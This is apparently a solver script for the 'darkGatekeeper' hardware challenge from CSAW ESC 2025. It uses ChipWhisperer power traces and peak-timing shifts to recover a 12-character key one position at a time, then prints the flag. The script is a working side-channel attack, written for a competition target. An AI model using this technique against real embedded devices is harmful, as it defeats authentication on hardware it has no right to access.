import chipwhisperer as cw
import numpy as np
from scipy.signal import find_peaks
import string
import sys

PLATFORM = "CWNANO"
#PLATFORM = "CWLITEARM"
PROG_TYPE = cw.programmers.STM32FProgrammer

#TARGET_BIN_PATH = f"../../targets/darkGatekeeper/darkGatekeeper-{PLATFORM}.hex"
TARGET_BIN_PATH = f"../../../csaw_esc_2025/challenges/set2/darkGatekeeper-CWNANO.hex"

RESPONSE_LEN = 18
SYMBOLS = string.digits + string.ascii_letters + string.punctuation
# PEAK_THRESHOLD_LOW = 0.255
PEAK_THRESHOLD_LOW = 0.1
PEAK_THRESHOLD_HIGH = 0.4

# Sets up scope and target
def cw_setup():
    scope = cw.scope()
    target = cw.target(scope, cw.targets.SimpleSerial)
    scope.default_setup()

    cw.program_target(scope, PROG_TYPE, TARGET_BIN_PATH)

    return scope, target

# Sends message, returns response from the target and captured trace
def send(scope: cw.scopes.ScopeTypes, target: cw.targets.TargetTypes, msg: bytearray) -> tuple[bytearray, np.ndarray]:
    scope.arm()

    target.simpleserial_write('a', msg)

    timeout = scope.capture()
    if timeout:
        print("mehhh, scope.capture timed out")

    response = target.simpleserial_read('r', RESPONSE_LEN, timeout=2000)
    trace = scope.get_last_trace()

    # idle state should be cut off from the trace
    return response, trace[:188]


def print_stats(flag, key, queries):
    print()
    print(f"Flag found: {flag}")
    print(f"Key found:  {key}")
    print(f"stats:")
    print(f"\t Number of queries: {queries}")
    print(f"\t Peaks height: {PEAK_THRESHOLD_LOW}")


# Some examples of peaks (on cwnano):
#   input: aaaaaaaaaaaa
#   peaks: [28, 41, 54, 67, 80, 93, 106, 119, 132, 145, 158, 175]
#   input: 7aaaaaaaaaaa
#   peaks: [29, 42, 55, 68, 81, 94, 107, 120, 133, 146, 159, 176]
#   input: 7aaaaaaaa7aa
#   peaks: [29, 42, 55, 68, 81, 94, 107, 120, 133, 147, 160, 177]
#   input: 7N4>aaaaaaaa
#   peaks: [29, 43, 57, 71, 84, 97, 110, 123, 136, 149, 162, 179]
#   input: 7N4>qp14c70!
#   peaks: [29, 43, 57, 71, 85, 99, 113, 127, 141, 155, 169, 187]

def find_right_positions(incorrect_peaks, curr_peaks):
    res = []

    base = 0
    diffs = [c - p for p, c in zip(incorrect_peaks, curr_peaks)]
    for i in range(len(diffs)):
        if diffs[i] != base:
            res.append(i)
            base = diffs[i]

    return res

if __name__ == "__main__":
    scope, target = cw_setup()

    key = bytearray(b'\x00' * 12)
    res, trace = send(scope, target, key)
    incorrect_peaks, _ = find_peaks(trace, height=PEAK_THRESHOLD_LOW, distance=12)
    incorrect_peaks = incorrect_peaks[2:]

    if len(incorrect_peaks) != 12:
        print(f"Num of peaks is incorrect (curr num: {len(incorrect_peaks)}), adjust threshhold. Peaks: {incorrect_peaks}")
        scope.dis()
        target.dis()
        sys.exit(0)

    queries = 1
    symbols_found = 0

    for sym in SYMBOLS:
        msg = bytearray(sym * 12, 'ascii')

        _, new_trace = send(scope, target, msg)
        queries += 1

        new_peaks, _ = find_peaks(new_trace, height=PEAK_THRESHOLD_LOW, distance=12)
        new_peaks = new_peaks[2:]

        if len(new_peaks) != len(incorrect_peaks):
            print(f"ooops, something went wrong. Incorrect peaks num: {len(incorrect_peaks)}, New peaks num: {len(new_peaks)}, {new_peaks}")
            print(f"Threshold used: {PEAK_THRESHOLD_LOW}. You probably need to adjust this value")
            continue

        update_pos = find_right_positions(incorrect_peaks, new_peaks)
        for i in update_pos:
            symbols_found += 1
            key[i] = ord(sym)

        if symbols_found == 12:
            res, _ = send(scope, target, key)
            print_stats(res, key, queries)
            break

    scope.dis()
    target.dis()
